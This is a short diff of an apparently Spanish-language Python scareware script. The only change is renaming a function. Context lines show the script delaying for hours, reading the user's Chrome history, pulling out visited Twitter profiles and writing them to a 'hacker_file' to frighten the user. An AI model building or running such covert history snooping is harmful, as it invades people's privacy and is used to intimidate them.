@@ -41,7 +41,7 @@ def delay_action():
     print(f"Esperando {n_houers} horas")
     sleep(n_houers)
 
-def check_history_and_scare_user(hacker_file, chrome_history):
+def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
     profiles_visited = []
     for item in chrome_history:
         results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
@@ -61,7 +61,7 @@ def main():
 
     #Obtenemos su historial de Google Chrome cuando sea posible
     chrome_history = get_chrome_history()
-    check_history_and_scare_user(hacker_file, chrome_history)
+    check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
 
 if __name__ == "__main__":
     main()
